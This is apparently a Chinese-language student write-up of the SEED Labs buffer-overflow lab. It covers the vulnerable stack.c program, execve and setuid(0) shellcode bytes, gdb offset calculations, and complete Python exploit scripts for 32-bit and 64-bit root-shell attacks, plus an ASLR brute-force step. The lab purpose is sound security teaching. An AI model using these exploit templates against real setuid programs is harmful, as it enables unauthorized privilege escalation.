zsh：Zsh（Z-shell）是一款用于交互式使用的shell，也可以作为脚本解释器来使用。其包含了bash，ksh，tcsh等其他shell中许多优秀功能，也拥有诸多自身特色。\n由于/bin/sh的符号链接指向/bin/dash，而/bin/dash有一种安全机制，我们需要将/bin/sh链接到我们安装的/bin/zsh上。\n使用命令：\nsudo ln -sf /bin/zsh /bin/sh Task1：熟悉shellcode C语言版本的shellcode #include \u0026lt;stdio.h\u0026gt; int main(){ char *name[2]; name[0] = \u0026#34;/bin/sh\u0026#34;; name[1] = NULL; execve(name[0], name, NULL); } 编译并设置所有者为root：\ngcc cshellcode.c -o cshellcode\rsudo chown root cshellcode\rsudo chmod 4755 cshellcode\r./cshellcode 发现成功进入了root shell。\n32bit shellcode ; Store the command on stack\rxor eax, eax\rpush eax\rpush \u0026#34;//sh\u0026#34;\rpush \u0026#34;/bin\u0026#34;\rmov ebx, esp ; ebx --\u0026gt; \u0026#34;/bin//sh\u0026#34;: execve()\u0026#39;s 1st argument\r; Construct the argument array argv[]\rpush eax ; argv[1] = 0\rpush ebx ; argv[0] --\u0026gt; \u0026#34;/bin//sh\u0026#34;\rmov ecx, esp ; ecx --\u0026gt; argv[]: execve()\u0026#39;s 2nd argument\r; For environment variable\rxor edx, edx ; edx = 0: execve()\u0026#39;s 3rd argument\r; Invoke execve()\rxor eax, eax ;\rmov al, 0x0b ; execve()\u0026#39;s system call number\rint 0x80 这段汇编代码通过将execve()函数的参数依次压入栈中，并通过ebx、ecx、edx三个寄存器向execve()传递参数，当我们将al的值设为0x0b，并执行int 0x80时，就会执行execve系统调用。\n64bit shellcode xor rdx, rdx ; rdx = 0: execve()\u0026#39;s 3rd argument\rpush rdx\rmov rax, \u0026#39;/bin//sh\u0026#39; ; the command we want to run\rpush rax ;\rmov rdi, rsp ; rdi --\u0026gt; \u0026#34;/bin//sh\u0026#34;: execve()\u0026#39;s 1st argument\rpush rdx ; argv[1] = 0\rpush rdi ; argv[0] --\u0026gt; \u0026#34;/bin//sh\u0026#34;\rmov rsi, rsp ; rsi --\u0026gt; argv[]: execve()\u0026#39;s 2nd argument\rxor rax, rax\rmov al, 0x3b ; execve()\u0026#39;s system call number\rsyscall 调用shellcode 在shellcode文件夹中，已经帮我们写好了Makefile文件，如下所示：\nall: gcc -m32 -z execstack -o a32.out call_shellcode.c gcc -z execstack -o a64.out call_shellcode.c setuid: gcc -m32 -z execstack -o a32.out call_shellcode.c gcc -z execstack -o a64.out call_shellcode.c sudo chown root a32.out a64.out sudo chmod 4755 a32.out a64.out clean: rm -f a32.out a64.out *.o 使用命令make all，会编译c源代码，生成a32.out和a64.out，执行发现会进入seed权限的shell\n使用命令make setuid，会编译c源代码，并将两个可执行文件设置为setuid文件，执行后发现进入root权限的shell\nTask2：理解漏洞程序 源码解释 在code目录下有一个stack.c，如下所示：\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; /* Changing this size will change the layout of the stack. * Instructors can change this value each year, so students * won\u0026#39;t be able to use the solutions from the past. */ #ifndef BUF_SIZE #define BUF_SIZE 100 #endif void dummy_function(char *str); int bof(char *str) { char buffer[BUF_SIZE]; // The following statement has a buffer overflow problem strcpy(buffer, str); return 1; } int main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(\u0026#34;badfile\u0026#34;, \u0026#34;r\u0026#34;); if (!badfile) { perror(\u0026#34;Opening badfile\u0026#34;); exit(1); } int length = fread(str, sizeof(char), 517, badfile); printf(\u0026#34;Input size: %d\\n\u0026#34;, length); dummy_function(str); fprintf(stdout, \u0026#34;==== Returned Properly ====\\n\u0026#34;); return 1; } // This function is used to insert a stack frame of size // 1000 (approximately) between main\u0026#39;s and bof\u0026#39;s stack frames. // The function itself does not do anything. void dummy_function(char *str) { char dummy_buffer[1000]; memset(dummy_buffer, 0, 1000); bof(str); } 该程序定义了一个常量BUF_SIZE=100，意味着缓冲区的大小为100 strcpy()函数没有边界检查功能，因此如果传入的str的大小超过缓冲区大小就会造成缓冲区溢出 在main函数里，会从badfile文件中读取一个输入，并将输入传入缓冲区 编译 在编译时我们需要使用-fno-stack-protector和-z execstack参数关闭 StackGuard 和不可执行栈的保护机制，这些已经写到Makefile中了，只需make即可。\nTask3：对 32-bit 程序实施攻击 (Level 1) 确定地址 在使用gcc编译时加入-g参数，可以将调试信息加入到二进制文件中，我们使用gdb对二进制文件进行调试。\n首先我们使用b bof在bof()函数处下断点 然后使用run命令运行程序到断点处，如下图所示： 我们可以看到汇编代码部分，下面详细解释：\n=\u0026gt; 0x565562ad \u0026lt;bof\u0026gt;:\tendbr32 0x565562b1 \u0026lt;bof+4\u0026gt;:\tpush ebp\r0x565562b2 \u0026lt;bof+5\u0026gt;:\tmov ebp,esp\r0x565562b4 \u0026lt;bof+7\u0026gt;:\tpush ebx\r0x565562b5 \u0026lt;bof+8\u0026gt;:\tsub esp,0x84 ebp：ebp（Extended Base Pointer）是x86架构中的一个寄存器，通常用于函数调用中的栈帧管理。它的主要用途是在程序执行过程中充当基址指针，具体来说，EBP在函数调用时保存了调用者的栈帧基址，并被用来创建当前函数的栈帧。\nesp：esp（Extended Stack Pointer）是x86架构中的一个寄存器，用于指向当前栈顶的位置。它是栈指针寄存器，用于管理栈的操作，特别是在函数调用和返回时对栈进行操作。\n可以发现esp的值还没赋给ebp，因此此时我们获取的值是函数调用者的地址。\n使用p $ebp打印 ebp 寄存器的地址：\ngdb-peda$ p $ebp $1 = (void *) 0xffffcf88 而我们想获得bof()函数的基址，需要先让程序执行到0x565562b2 \u0026lt;bof+5\u0026gt;:\tmov ebp,esp这步之后ebp中存储的地址才是bof()函数的基址。\n使用next命令进行单步调试，此时再使用p $ebp打印 ebp 寄存器的地址，才是bof()函数的基址。\ngdb-peda$ p $ebp $2 = (void *) 0xffffcb78 此时再使用p \u0026amp;buffer来获取缓冲区的起始地址\ngdb-peda$ p \u0026amp;buffer $3 = (char (*)[120]) 0xffffcaf8 生成shellcode 我们需要将前面提到的32bit的shellcode转为机器码，如下所示：\n\\x31\\xc0 // xor eax,eax\r\\x50 // push eax\r\\x68\\x2f\\x2f\\x73\\x68 // push 0x68732f2f (\u0026#34;//sh\u0026#34;)\r\\x68\\x2f\\x62\\x69\\x6e // push 0x6e69622f (\u0026#34;/bin\u0026#34;)\r\\x89\\xe3 // mov ebx,esp\r\\x50 // push eax\r\\x53 // push ebx\r\\x89\\xe1 // mov ecx,esp\r\\x31\\xd2 // xor edx,edx\r\\x31\\xc0 // xor eax,eax\r\\xb0\\x0b // mov al,0xb\r\\xcd\\x80 // int 0x80 所以shellcode就可以写为：\nshellcode= ( \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) 布置shellcode 为了实现缓冲区溢出攻击，我们需要精心设计shellcode的位置以及覆盖原有函数的地址，使shellcode可以执行并返回。\n我们选择在离返回地址较近的地方来布置我们的shellcode，由于content的长度为517，我们的shellcode长度为27，所以我们选择在450位置写入shellcode\n# Put the shellcode somewhere in the payload start = 450 # Change this number content[start:start + len(shellcode)] = shellcode 覆盖返回地址 首先要计算我们布置的shellcode的地址，将这个作为返回地址： $$ ret=\u0026amp;buffer(缓冲区起始地址)+start(shellcode在缓冲区里的位置) $$\n然后我们需要将这个返回地址写入溢出的某个位置，使其正好覆盖bof()函数的返回地址，如下： +-----------------+\r| retaddr |\r+-----------------+\r| 4bit |\rebp---\u0026gt;+-----------------+\r| |\r| |\r| |\r| |\r| |\r| |\r\u0026amp;buffer--\u0026gt;+-----------------+ 不难计算出，bof函数的返回地址在缓冲区中的偏移offset： $$ offset=$ebp-\u0026amp;buffer+4 $$\n编写exp #!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 450 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0xffffcaf8+start # Change this number offset = 0xffffcb78-0xffffcaf8+4 # Change this number L = 4 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 执行我们的exp，并执行写入shellcode后的程序：\n攻击成功，获得了root shell。\nTask4：在不知道缓冲区大小的情况下实施攻击 (Level 2) 在不知道缓冲区大小的情况下，我们假设你知道缓冲区大小的范围是 100∼200 字节，所以我们可以将buffer的前204位置全部设置为ret的地址，这样只要发生缓冲区溢出，且溢出可以覆盖返回地址，我们就可以成功进行攻击。\n# Put the shellcode somewhere in the payload start = 400 # Change this number content[start:start + len(shellcode)] = shellcode 使用gdb调试，找到函数的起始地址和缓冲区的起始地址：\ngdb-peda$ p $ebp $1 = (void *) 0xffffcb88 gdb-peda$ p \u0026amp;buffer $2 = (char (*)[180]) 0xffffcacc 编写exp：\n#!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\u0026#34; \u0026#34;\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\u0026#34; \u0026#34;\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 400 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0xffffcacc+start # Change this number #ret = 0x55555555522e offset = 0xffffcb88-0xffffcacc+4 # Change this number L = 4 # Use 4 for 32-bit address and 8 for 64-bit address content[0:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) *(204//4) #将前204位全部填充ret ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 执行exp，并执行写入shellcode后的可执行文件stack-L2\n发现成功进入root shell，并且只需要一次，无需爆破。\nTask5：对 64-bit 程序实施攻击 (Level 3) 由于程序是通过strcpy()将badfile读取到buffer里的，因此我们的shellcode中不能出现\\x00，因为这样会导致strcpy截断，同时写入的返回地址的前两位总是00，由于地址在栈中是以小端序存储的，因此我们只要将返回地址写到badfile的最后位置就行，这样就可以读取到完整的shellcode。\n首先使用gdb调试获取缓冲区起始地址和函数返回地址：\n[----------------------------------registers-----------------------------------] RAX: 0x7fffffffddf0 --\u0026gt; 0x9090909090909090 RBX: 0x555555555360 (\u0026lt;__libc_csu_init\u0026gt;:\tendbr64) RCX: 0x7fffffffddc0 --\u0026gt; 0x0 RDX: 0x7fffffffddc0 --\u0026gt; 0x0 RSI: 0x0 RDI: 0x7fffffffddf0 --\u0026gt; 0x9090909090909090 RBP: 0x7fffffffd9c0 --\u0026gt; 0x7fffffffddd0 --\u0026gt; 0x7fffffffe010 --\u0026gt; 0x0 RSP: 0x7fffffffd8c0 --\u0026gt; 0x7ffff7ffd9e8 --\u0026gt; 0x7ffff7fcf000 --\u0026gt; 0x10102464c457f RIP: 0x55555555523f (\u0026lt;bof+22\u0026gt;:\tmov rdx,QWORD PTR [rbp-0xf8]) R8 : 0x0 R9 : 0x10 R10: 0x55555555602c --\u0026gt; 0x52203d3d3d3d000a (\u0026#39;\\n\u0026#39;) R11: 0x246 R12: 0x555555555140 (\u0026lt;_start\u0026gt;:\tendbr64) R13: 0x7fffffffe100 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x55555555522e \u0026lt;bof+5\u0026gt;:\tmov rbp,rsp 0x555555555231 \u0026lt;bof+8\u0026gt;:\tsub rsp,0x100 0x555555555238 \u0026lt;bof+15\u0026gt;:\tmov QWORD PTR [rbp-0xf8],rdi =\u0026gt; 0x55555555523f \u0026lt;bof+22\u0026gt;:\tmov rdx,QWORD PTR [rbp-0xf8] 0x555555555246 \u0026lt;bof+29\u0026gt;:\tlea rax,[rbp-0xf0] 0x55555555524d \u0026lt;bof+36\u0026gt;:\tmov rsi,rdx 0x555555555250 \u0026lt;bof+39\u0026gt;:\tmov rdi,rax 0x555555555253 \u0026lt;bof+42\u0026gt;:\tcall 0x5555555550c0 \u0026lt;strcpy@plt\u0026gt; [------------------------------------stack-------------------------------------] 0000| 0x7fffffffd8c0 --\u0026gt; 0x7ffff7ffd9e8 --\u0026gt; 0x7ffff7fcf000 --\u0026gt; 0x10102464c457f 0008| 0x7fffffffd8c8 --\u0026gt; 0x7fffffffddf0 --\u0026gt; 0x9090909090909090 0016| 0x7fffffffd8d0 --\u0026gt; 0x7fffffffd964 --\u0026gt; 0x0 0024| 0x7fffffffd8d8 --\u0026gt; 0x7fffffffd9c0 --\u0026gt; 0x7fffffffddd0 --\u0026gt; 0x7fffffffe010 --\u0026gt; 0x0 0032| 0x7fffffffd8e0 --\u0026gt; 0x7ffff7fcf7f0 --\u0026gt; 0x675f646c74725f00 (\u0026#39;\u0026#39;) 0040| 0x7fffffffd8e8 --\u0026gt; 0x7ffff7fb6520 --\u0026gt; 0x7ffff7ffe190 --\u0026gt; 0x555555554000 --\u0026gt; 0x10102464c457f 0048| 0x7fffffffd8f0 --\u0026gt; 0x3 0056| 0x7fffffffd8f8 --\u0026gt; 0x7ffff7fcf4c0 --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 20\tstrcpy(buffer, str); gdb-peda$ p $rbp $1 = (void *) 0x7fffffffd9c0 gdb-peda$ p \u0026amp;buffer $2 = (char (*)[240]) 0x7fffffffd8d0 计算偏移：\nPython 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; print(0x7fffffffd9c0-0x7fffffffd8d0+8) 248 因此我们需要把shellcode写到248之前，我们从100开始写，如下所示：\n# Put the shellcode somewhere in the payload start = 100 # Change this number content[start:start + len(shellcode)] = shellcode 调试查看栈中数据：\n使用命令stack 400\n发现正是我们写入的shellcode和shellcode的返回地址，而且是以小端序存储的，这证明了没有被\\x00截断，成功写入了缓冲区。\n完整exp如下：\n#!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\u0026#34; \u0026#34;\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\u0026#34; \u0026#34;\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 100 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0x7fffffffd8d0+start # Change this number offset = 0x7fffffffd9c0-0x7fffffffd8d0+8 # Change this number L = 8 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 攻击效果：\n攻击成功，拿到root shell。\nTask6：对 64-bit 程序实施攻击 (Level 4) 本任务的缓冲区大小只有10。\n先使用gdb找到缓冲区起始地址和函数返回地址\ngdb-peda$ p $rbp $1 = (void *) 0x7fffffffd9c0 gdb-peda$ p \u0026amp;buffer $2 = (char (*)[10]) 0x7fffffffd9b6 由于缓冲区太小，放不下我们的shellcode，于是我们可以利用main函数里的char str[517]\nint main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(\u0026#34;badfile\u0026#34;, \u0026#34;r\u0026#34;); if (!badfile) { perror(\u0026#34;Opening badfile\u0026#34;); exit(1); } int length = fread(str, sizeof(char), 517, badfile); printf(\u0026#34;Input size: %d\\n\u0026#34;, length); dummy_function(str); fprintf(stdout, \u0026#34;==== Returned Properly ====\\n\u0026#34;); return 1; } 在main函数下断点，然后当str入栈时，查看shellcode的地址，如下所示：\n发现了str上的shellcode的返回地址（0x7fffffffde58+4=0x7fffffffde5c）\n于是将ret的值设为0x7fffffffde5c\n完整exp如下：\n#!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x48\\x31\\xd2\u0026#34; # xor rdx, rdx ; rdx = 0 (NULL) \u0026#34;\\x52\u0026#34; # push rdx ; push NULL (for argv/envp) \u0026#34;\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\u0026#34; # movabs rax, 0x68732f2f6e69622f ; \u0026#34;/bin//sh\u0026#34; \u0026#34;\\x50\u0026#34; # push rax ; push \u0026#34;/bin//sh\u0026#34; on the stack \u0026#34;\\x48\\x89\\xe7\u0026#34; # mov rdi, rsp ; rdi = pointer to \u0026#34;/bin//sh\u0026#34; \u0026#34;\\x52\u0026#34; # push rdx ; push NULL (argv[0] = NULL) \u0026#34;\\x57\u0026#34; # push rdi ; push \u0026#34;/bin//sh\u0026#34; address for argv[0] \u0026#34;\\x48\\x89\\xe6\u0026#34; # mov rsi, rsp ; rsi = pointer to argv \u0026#34;\\x48\\x31\\xc0\u0026#34; # xor rax, rax ; rax = 0 (clear rax) \u0026#34;\\xb0\\x3b\u0026#34; # mov al, 0x3b ; syscall number for execve (0x3b) \u0026#34;\\x0f\\x05\u0026#34; # syscall ; invoke syscall ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 108 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0x7fffffffde5c # Change this number #ret = 0x55555555522e offset = 0x7fffffffd9c0-0x7fffffffd9b6+8 # Change this number L = 8 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 执行结果：\nTask7：攻破 dash 的保护机制 设置/bin/dash 我们首先改回去，让/bin/sh指向/bin/dash：\n$ sudo ln -sf /bin/dash /bin/sh 测试shellcode 输入make setuid将call_shellcode.c编译为root所有的二进制文件，不调用setuid(0)的时候：\n可以发现由于/bin/dash的防护机制，执行shellcode后并没有进入 root shell。\n现在修改call_shellcode.c，调用setuid(0)：\n发现成功获取 root shell。\n对32bit和64bit程序实施攻击 bin/dash通过检测当前进程的euid是不是和uid相同，如果检测到不同，就会主动放弃特权，导致我们拿不到root shell，我们先使用之前32位的exp试试：\n发现确实没有拿到root shell。\n于是我们修改我们的shellcode，在前面加入以下汇编的机器码：\n; Invoke setuid(0): 32-bit\rxor ebx, ebx ; ebx = 0: setuid()\u0026#39;s argument\rxor eax, eax\rmov al, 0xd5 ; setuid()\u0026#39;s system call number\rint 0x80\r; Invoke setuid(0): 64-bit\rxor rdi, rdi ; rdi = 0: setuid()\u0026#39;s argument\rxor rax, rax\rmov al, 0x69 ; setuid()\u0026#39;s system call number\rsyscall\r// Binary code for setuid(0) // 64-bit: \u0026#34;\\x48\\x31\\xff\\x48\\x31\\xc0\\xb0\\x69\\x0f\\x05\u0026#34;\r// 32-bit: \u0026#34;\\x31\\xdb\\x31\\xc0\\xb0\\xd5\\xcd\\x80\u0026#34; 32bit #!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x31\\xdb\\x31\\xc0\\xb0\\xd5\\xcd\\x80\u0026#34; #setuid(0) \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\u0026#34; \u0026#34;\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\u0026#34; \u0026#34;\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 400 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0xffffcb08+start # Change this number offset = 0xffffcb88-0xffffcb08+4 # Change this number L = 4 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 写入并执行，成功拿到root shell：\n64bit #!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x48\\x31\\xff\\x48\\x31\\xc0\\xb0\\x69\\x0f\\x05\u0026#34; #setuid(0) \u0026#34;\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\u0026#34; \u0026#34;\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\u0026#34; \u0026#34;\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 100 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0x7fffffffd8d0+start # Change this number offset = 0x7fffffffd9c0-0x7fffffffd8d0+8 # Change this number L = 8 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) Task8：攻破地址随机化 打开地址随机化：\n$ sudo /sbin/sysctl -w kernel.randomize_va_space=2 使用sh brute-force.sh，运行暴力破解脚本，不断的运行stack-L1\n成功进入root shell。\nTask9：测试其他保护机制 打开 StackGuard 保护机制 编译时不使用-fno-stack-protector参数，重新编译stack-L1\n将以下的部分加入Makefile\nstackguard: gcc -DBUF_SIZE=$(L1) -z execstack $(FLAGS_32) -o stack-L1 stack.c gcc -DBUF_SIZE=$(L1) -z execstack $(FLAGS_32) -g -o stack-L1-dbg stack.c sudo chown root stack-L1 \u0026amp;\u0026amp; sudo chmod 4755 stack-L1 使用make stackguard进行编译：\n可以发现检测到了栈溢出，终止了程序。\n打开不可执行栈保护机制 编译时使用-z noexecstack参数，使栈上不可执行shellcode\n将以下写入makefile：\nnoexecstack: gcc -m32 -z noexecstack -o a32.out call_shellcode.c gcc -z noexecstack -o a64.out call_shellcode.c sudo chown root a32.out a64.out sudo chmod 4755 a32.out a64.out 发现程序报错，都无法提权。\n","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","summary":"\u003ch1 id=\"seedlab缓冲区溢出漏洞\"\u003eSEEDlab—缓冲区溢出漏洞\u003c/h1\u003e\n\u003ch2 id=\"环境设置\"\u003e环境设置\u003c/h2\u003e\n\u003ch3 id=\"关闭反制措施\"\u003e关闭反制措施\u003c/h3\u003e\n\u003ch4 id=\"地址空间布局随机化\"\u003e地址空间布局随机化\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e地址空间布局随机化\u003c/strong\u003e：Linux操作系统的使用随机的地址来设置堆栈的起始地址，使得攻击者很难猜测出确切的堆栈起始地址。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e使用命令\u003ccode\u003esudo sysctl -w kernel.randomize_va_space=0\u003c/code\u003e来关闭地址空间布局随机化。\u003c/p\u003e","title":"SEEDlab—缓冲区溢出漏洞"}]